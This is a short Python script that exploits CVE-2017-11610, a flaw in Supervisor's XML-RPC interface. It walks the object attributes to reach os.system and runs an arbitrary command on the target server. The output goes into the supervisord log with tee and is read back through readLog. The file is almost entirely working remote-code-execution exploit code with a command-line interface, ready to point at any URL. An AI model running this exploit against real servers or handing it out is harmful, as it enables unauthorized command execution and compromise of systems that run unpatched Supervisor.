# -*- coding: utf-8 -*-
# author: seven
import argparse
import xmlrpc.client

def run(url,cmd):
    try:
        with xmlrpc.client.ServerProxy(url) as proxy:
            old = getattr(proxy, 'supervisor.readLog')(0, 0)
            logfile = getattr(proxy, 'supervisor.supervisord.options.logfile.strip')()
            getattr(proxy, 'supervisor.supervisord.options.warnings.linecache.os.system')(
                '{} | tee -a {}'.format(cmd, logfile))
            result = getattr(proxy, 'supervisor.readLog')(0, 0)
            return result[len(old):]
    except Exception as e:
        print(e)
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="used CVE-2017-11610")
    parser.add_argument("url",help="target url with rpc.example:http://127.0.0.1/RPC2")
    parser.add_argument('-c','--cmd',default='whoami',help="cmd to execute")
    args = parser.parse_args()

    result = run(args.url,args.cmd)
    print(result)
